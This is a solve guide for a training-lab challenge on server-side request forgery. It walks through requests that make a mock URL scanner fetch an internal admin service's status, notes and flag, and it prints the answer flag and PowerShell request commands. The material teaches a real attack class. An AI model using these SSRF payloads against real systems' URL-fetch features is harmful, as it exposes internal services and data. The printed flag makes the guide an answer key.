# Challenge 03 Cheat Sheet (Step-by-Step)

This is a practical solve guide for:

**Challenge 03 — SSRF & Internal Service Discovery**

Target: `scanner.internal.lab`  
App: URL Inspection Service

---

## Quick outcome
You will:
1. Send URL scan requests to the scanner API.
2. Prove external destinations are blocked.
3. Use scanner SSRF to reach an internal-only admin service.
4. Retrieve the flag.
5. Submit the flag and complete the challenge.

Expected final flag:

`CYBERLAB{ssrf_internal_network}`

---

## 0) Start the lab
From project root:

```bash
npm install
npm run dev -- -p 3005
```

Open challenge page:

`http://localhost:3005/challenges/ssrf-internal-service-discovery`

Open target app:

`http://localhost:3005/targets/scanner`

---

## 1) Understand the vulnerable feature
The scanner has a URL input field and sends it to backend endpoint:

- **Method:** `POST`
- **Endpoint:** `/api/scanner/api/scan`
- **Body:** `{ "url": "..." }`

The server makes the request (not your browser), which is why SSRF is possible.

---

## 2) Confirm invalid URL handling
Send a malformed URL first.

### Request
- **Method:** `POST`
- **Endpoint:** `/api/scanner/api/scan`
- **Headers:** `Content-Type: application/json`
- **Body:**

```json
{"url":"not-a-url"}
```

### Expected response
- **Status:** `400`
- **Body contains:** `invalid url`

Why this matters: verifies parsing/validation behavior before SSRF testing.

---

## 3) Confirm external destinations are blocked
Try a public hostname.

### Request
```json
{"url":"http://example.com/"}
```

### Expected response
- **Status:** `403`
- **Body contains:** `destination is outside the inspection network`

Why this matters: shows scanner applies allowlist/target restriction.

---

## 4) Discover internal service via SSRF
Now provide internal target URL.

### Request
```json
{"url":"http://internal-admin.internal.lab/api/status"}
```

### Expected response
- **Status:** `200`
- Response includes internal metadata (service/hostname/status)

This proves scanner can reach internal service that should not be directly exposed.

---

## 5) Enumerate internal endpoint hints
Query internal notes endpoint.

### Request
```json
{"url":"http://internal-admin.internal.lab/api/notes"}
```

### Expected response
- **Status:** `200`
- Notes mention restricted objective under `/api/flag`

---

## 6) Retrieve flag from internal endpoint
Request internal flag path.

### Request
```json
{"url":"http://internal-admin.internal.lab/api/flag"}
```

### Expected response
- **Status:** `200`
- Body contains:

`CYBERLAB{ssrf_internal_network}`

At this point the challenge evidence should mark internal retrieval progress.

---

## 7) Submit the flag in challenge workflow
Submit through challenge completion endpoint.

### Request
- **Method:** `POST`
- **Endpoint:** `/api/scanner/submit`
- **Headers:** `Content-Type: application/json`
- **Body:**

```json
{"flag":"CYBERLAB{ssrf_internal_network}"}
```

### Expected response
- **Status:** `200`
- **Body:** `{ "accepted": true }`

Challenge UI should show completion.

---

## 8) Verify completion state
Check progress endpoint:

- **Method:** `GET`
- **Endpoint:** `/api/scanner/api/progress`

Expected key fields after success:
- `internal: true`
- `retrieved: true`
- `submitted: true`

---

## 9) Reset and solve again (required practice)
Reset challenge state:

- **Method:** `POST`
- **Endpoint:** `/api/scanner/reset`

Expected:
- `200` with reset confirmation
- Progress fields return to false

Re-run Steps 4 → 7 to confirm deterministic repeatability.

---

## Browser-first solve path (very easy)
1. Open `/targets/scanner`.
2. Submit `http://internal-admin.internal.lab/api/status`.
3. Submit `http://internal-admin.internal.lab/api/notes`.
4. Submit `http://internal-admin.internal.lab/api/flag`.
5. Copy flag value.
6. Open `/challenges/ssrf-internal-service-discovery`.
7. Paste flag and submit.

---

## PowerShell request examples

### Scan request template
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:3005/api/scanner/api/scan" -ContentType "application/json" -Body '{"url":"http://internal-admin.internal.lab/api/status"}'
```

### Submit flag
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:3005/api/scanner/submit" -ContentType "application/json" -Body '{"flag":"CYBERLAB{ssrf_internal_network}"}'
```

### Reset challenge
```powershell
Invoke-RestMethod -Method Post -Uri "http://localhost:3005/api/scanner/reset"
```

---

## Common mistakes
- Typo in hostname (`internal-admin.internal.lab` must be exact).
- Trying to submit flag before `/api/flag` retrieval.
- Using malformed URL format (missing scheme like `http://`).
- Assuming browser direct access to internal admin exists (it should be reached through scanner flow).

---

## Security concept recap
This challenge demonstrates SSRF: backend URL-fetch functionality can be abused to access internal-only services and sensitive data if destination controls are weak or overly trusted.
